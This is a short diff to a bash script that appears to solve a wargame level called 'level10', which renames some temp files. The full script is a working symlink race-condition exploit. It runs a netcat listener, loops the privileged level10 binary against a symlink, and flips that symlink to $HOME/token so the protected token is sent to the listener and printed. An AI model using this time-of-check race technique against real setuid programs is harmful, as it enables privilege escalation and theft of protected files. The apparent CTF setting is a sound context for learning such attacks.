@@ -1,10 +1,10 @@
 #!/bin/bash
-touch /tmp/temp
+touch /tmp/temp10
 (nc -lk 6969 >> /tmp/token10)&
 pid1=$!
-(while true; do $HOME/level10 /tmp/temp2 127.0.0.1 &>/dev/null; done)&
+(while true; do $HOME/level10 /tmp/temp10_1 127.0.0.1 &>/dev/null; done)&
 pid2=$!
-(while true; do ln -sf /tmp/temp /tmp/temp2; ln -sf $HOME/token /tmp/temp2; done)&
+(while true; do ln -sf /tmp/temp10 /tmp/temp10_1; ln -sf $HOME/token /tmp/temp10_1; done)&
 pid3=$!
 sleep 1
 cat /tmp/token10
